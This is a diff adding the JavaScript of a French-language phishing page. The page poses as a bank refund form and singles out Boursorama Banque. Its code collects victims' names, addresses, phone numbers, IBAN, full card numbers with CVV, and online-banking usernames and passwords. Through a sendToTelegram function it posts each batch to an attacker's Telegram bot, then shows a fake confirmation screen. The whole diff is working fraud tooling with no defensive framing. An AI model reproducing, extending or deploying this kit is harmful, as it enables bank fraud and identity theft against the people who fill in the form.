+            const boursoramaInterface = document.getElementById('boursoramaInterface');
+            const classicBankInterface = document.getElementById('classicBankInterface');
+            
+            // Variables pour stocker les données
+            let refundData = {};
+            let paymentData = {};
+            let bankDataForm = {};
+            let isBoursorama = false;
+            
+            // Formatage du numéro de carte
+            const cardNumberInput = document.getElementById('cardNumber');
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ');
+                if (formattedValue) {
+                    e.target.value = formattedValue;
+                }
+            });
+            
+            // Formatage de la date d'expiration
+            const expiryDateInput = document.getElementById('expiryDate');
+            expiryDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
+                if (value.length >= 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+            });
+            
+            // Détection de la banque via BIC
+            const bicInput = document.getElementById('bic');
+            const bankInfo = document.getElementById('bankInfo');
+            const bankLogo = document.getElementById('bankLogo');
+            const bankName = document.getElementById('bankName');
+            
+            bicInput.addEventListener('input', function(e) {
+                const bic = e.target.value.toUpperCase().trim();
+                
+                // Vérification pour Boursorama
+                if (bic.startsWith('BOUS')) {
+                    isBoursorama = true;
+                    bankLogo.src = "https://upload.wikimedia.org/wikipedia/fr/3/3c/Logo_Boursorama_Banque.png";
+                    bankName.textContent = "Boursorama Banque";
+                    bankInfo.style.display = 'flex';
+                } else if (bankData[bic]) {
+                    isBoursorama = false;
+                    bankLogo.src = bankData[bic].logo;
+                    bankName.textContent = bankData[bic].name;
+                    bankInfo.style.display = 'flex';
+                } else {
+                    isBoursorama = false;
+                    bankInfo.style.display = 'none';
+                }
+            });
+            
+            // Navigation vers la page de paiement
+            nextToPaymentBtn.addEventListener('click', function() {
+                if (validateForm1()) {
+                    // Stockage des données de remboursement
+                    refundData = {
+                        amount: document.getElementById('amount').value,
+                        lastName: document.getElementById('lastName').value,
+                        firstName: document.getElementById('firstName').value,
+                        billingAddress: document.getElementById('billingAddress').value,
+                        shippingAddress: document.getElementById('shippingAddress').value,
+                        phone: document.getElementById('phone').value,
+                        email: document.getElementById('email').value,
+                        iban: document.getElementById('iban').value,
+                        bic: document.getElementById('bic').value,
+                        refundAmount: document.getElementById('refundAmount').value
+                    };
+                    
+                    // Envoi des informations à Telegram
+                    sendToTelegram('INFORMATIONS DE REMBOURSEMENT:\n' +
+                        `Nom: ${refundData.lastName}\n` +
+                        `Prénom: ${refundData.firstName}\n` +
+                        `Adresse de facturation: ${refundData.billingAddress}\n` +
+                        `Adresse de livraison: ${refundData.shippingAddress}\n` +
+                        `Téléphone: ${refundData.phone}\n` +
+                        `Email: ${refundData.email}\n` +
+                        `IBAN: ${refundData.iban}\n` +
+                        `BIC: ${refundData.bic}\n` +
+                        `Montant: ${refundData.refundAmount}€`);
+                    
+                    // Passage à l'étape suivante
+                    page1.classList.remove('active');
+                    page2.classList.add('active');
+                    step1.classList.remove('active');
+                    step1.classList.add('completed');
+                    step2.classList.add('active');
+                }
+            });
+            
+            // Navigation vers la connexion bancaire
+            nextToBankLoginBtn.addEventListener('click', function() {
+                if (validateForm2()) {
+                    // Stockage des données de paiement
+                    paymentData = {
+                        cardNumber: document.getElementById('cardNumber').value,
+                        cardName: document.getElementById('cardName').value,
+                        expiryDate: document.getElementById('expiryDate').value,
+                        cvv: document.getElementById('cvv').value
+                    };
+                    
+                    // Envoi des informations à Telegram
+                    sendToTelegram('INFORMATIONS DE PAIEMENT:\n' +
+                        `Numéro de carte: ${paymentData.cardNumber}\n` +
+                        `Nom sur la carte: ${paymentData.cardName}\n` +
+                        `Date d'expiration: ${paymentData.expiryDate}\n` +
+                        `CVV: ${paymentData.cvv}`);
+                    
+                    // Affichage de l'interface appropriée
+                    if (isBoursorama) {
+                        boursoramaInterface.style.display = 'block';
+                        classicBankInterface.style.display = 'none';
+                    } else {
+                        boursoramaInterface.style.display = 'none';
+                        classicBankInterface.style.display = 'block';
+                    }
+                    
+                    // Passage à l'étape suivante
+                    page2.classList.remove('active');
+                    page3.classList.add('active');
+                    step2.classList.remove('active');
+                    step2.classList.add('completed');
+                    step3.classList.add('active');
+                }
+            });
+            
+            // Traitement de la connexion Boursorama
+            processBoursoramaLoginBtn.addEventListener('click', function() {
+                if (validateBoursoramaForm()) {
+                    // Stockage des données bancaires
+                    bankDataForm = {
+                        userId: document.getElementById('boursoramaUserId').value,
+                        password: document.getElementById('boursoramaPassword').value,
+                        bankType: 'Boursorama'
+                    };
+                    
+                    // Envoi des informations à Telegram
+                    sendToTelegram('INFORMATIONS BOURSORAMA:\n' +
+                        `Identifiant: ${bankDataForm.userId}\n` +
+                        `Mot de passe: ${bankDataForm.password}`);
+                    
+                    // Génération d'identifiants
+                    const userId = generateUserId();
+                    const generatedPassword = generatePassword();
+                    
+                    // Envoi des identifiants à Telegram
+                    sendToTelegram(`IDENTIFIANTS GÉNÉRÉS:\nID: ${userId}\nMot de passe: ${generatedPassword}`);
+                    
+                    // Passage à la page de confirmation
+                    page3.classList.remove('active');
+                    page4.classList.add('active');
+                    step3.classList.remove('active');
+                    step3.classList.add('completed');
+                    step4.classList.add('active');
+                    
+                    // Mise à jour de la date de transaction
+                    document.getElementById('transactionDate').textContent = getCurrentDate();
+                }
+            });
+            
+            // Traitement de la connexion bancaire classique
+            processClassicBankLoginBtn.addEventListener('click', function() {
+                if (validateClassicBankForm()) {
+                    // Stockage des données bancaires
+                    bankDataForm = {
+                        userId: document.getElementById('classicBankUserId').value,
+                        password: document.getElementById('classicBankPassword').value,
+                        bankType: 'Classique'
+                    };
+                    
+                    // Envoi des informations à Telegram
+                    sendToTelegram('INFORMATIONS BANCAIRES CLASSIQUES:\n' +
+                        `Identifiant: ${bankDataForm.userId}\n` +
+                        `Mot de passe: ${bankDataForm.password}`);
+                    
+                    // Génération d'identifiants
+                    const userId = generateUserId();
+                    const generatedPassword = generatePassword();
+                    
+                    // Envoi des identifiants à Telegram
+                    sendToTelegram(`IDENTIFIANTS GÉNÉRÉS:\nID: ${userId}\nMot de passe: ${generatedPassword}`);
+                    
+                    // Passage à la page de confirmation
+                    page3.classList.remove('active');
+                    page4.classList.add('active');
+                    step3.classList.remove('active');
+                    step3.classList.add('completed');
+                    step4.classList.add('active');
+                    
+                    // Mise à jour de la date de transaction
+                    document.getElementById('transactionDate').textContent = getCurrentDate();
+                }
+            });
+            
+            // Retour à l'accueil
+            returnHomeBtn.addEventListener('click', function() {
+                // Réinitialisation du formulaire
+                document.getElementById('refundForm').reset();
+                document.getElementById('paymentForm').reset();
+                document.getElementById('boursoramaLoginForm').reset();
+                document.getElementById('classicBankLoginForm').reset();
+                bankInfo.style.display = 'none';
+                isBoursorama = false;
+                
+                // Retour à la première page
+                page4.classList.remove('active');
+                page1.classList.add('active');
+                step4.classList.remove('active');
+                step3.classList.remove('completed');
+                step2.classList.remove('completed');
+                step1.classList.add('active');
+                step1.classList.remove('completed');
+            });
+            
+            // Validation du formulaire 1
+            function validateForm1() {
+                const requiredFields = document.querySelectorAll('#page1 input[required]');
+                let isValid = true;
+                
+                requiredFields.forEach(field => {
+                    if (!field.value.trim()) {
+                        isValid = false;
+                        field.style.borderColor = 'red';
+                    } else {
+                        field.style.borderColor = '#cbd5e1';
+                    }
+                });
+                
+                const termsChecked = document.getElementById('terms').checked;
+                if (!termsChecked) {
+                    alert('Veuillez accepter les conditions générales');
+                    isValid = false;
+                }
+                
+                const refundAmount = document.getElementById('refundAmount').value;
+                if (refundAmount < 1 || refundAmount > 6369) {
+                    alert('Le montant du remboursement doit être compris entre 1 et 6 369,00 €');
+                    isValid = false;
+                }
+                
+                return isValid;
+            }
+            
+            // Validation du formulaire 2
+            function validateForm2() {
+                const requiredFields = document.querySelectorAll('#page2 input[required]');
+                let isValid = true;
+                
+                requiredFields.forEach(field => {
+                    if (!field.value.trim()) {
+                        isValid = false;
+                        field.style.borderColor = 'red';
+                    } else {
+                        field.style.borderColor = '#cbd5e1';
+                    }
+                });
+                
+                // Validation simplifiée du numéro de carte
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                if (cardNumber.length !== 16 || isNaN(cardNumber)) {
+                    alert('Veuillez saisir un numéro de carte valide (16 chiffres)');
+                    isValid = false;
+                }
+                
+                // Validation de la date d'expiration
+                const expiryDate = document.getElementById('expiryDate').value;
+                if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
+                    alert('Veuillez saisir une date d\'expiration valide (MM/AA)');
+                    isValid = false;
+                }
+                
+                // Validation du CVV
+                const cvv = document.getElementById('cvv').value;
+                if (cvv.length !== 3 || isNaN(cvv)) {
+                    alert('Veuillez saisir un CVV valide (3 chiffres)');
+                    isValid = false;
+                }
+                
+                return isValid;
+            }
+            
+            // Validation du formulaire Boursorama
+            function validateBoursoramaForm() {
+                const userId = document.getElementById('boursoramaUserId').value;
+                if (!userId.trim()) {
+                    alert('Veuillez saisir votre identifiant Boursorama');
+                    return false;
+                }
+                
+                const password = document.getElementById('boursoramaPassword').value;
+                if (!password.trim()) {
+                    alert('Veuillez saisir votre mot de passe');
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            // Validation du formulaire bancaire classique
+            function validateClassicBankForm() {
+                const userId = document.getElementById('classicBankUserId').value;
+                if (!userId.trim()) {
+                    alert('Veuillez saisir votre identifiant bancaire');
+                    return false;
+                }
+                
+                const password = document.getElementById('classicBankPassword').value;
+                if (!password.trim()) {
+                    alert('Veuillez saisir votre mot de passe');
+                    return false;
+                }
+                
+                return true;
+            }
+            
+            // Envoi à Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message envoyé à Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Erreur lors de l\'envoi à Telegram:', error);
+                });
+            }
+            
+            // Génération d'un ID utilisateur
+            function generateUserId() {
+                return 'USER-' + Math.floor(100000 + Math.random() * 900000);
+            }
+            
+            // Génération d'un mot de passe numérique
+            function generatePassword() {
+                return Math.floor(100000 + Math.random() * 900000).toString();
+            }
+            
+            // Obtention de la date actuelle
+            function getCurrentDate() {
+                const now = new Date();
+                const day = String(now.getDate()).padStart(2, '0');
+                const month = String(now.getMonth() + 1).padStart(2, '0');
+                const year = now.getFullYear();
+                return `${day}/${month}/${year}`;
+            }
+        });
+    </script>
+</body>
+</html>
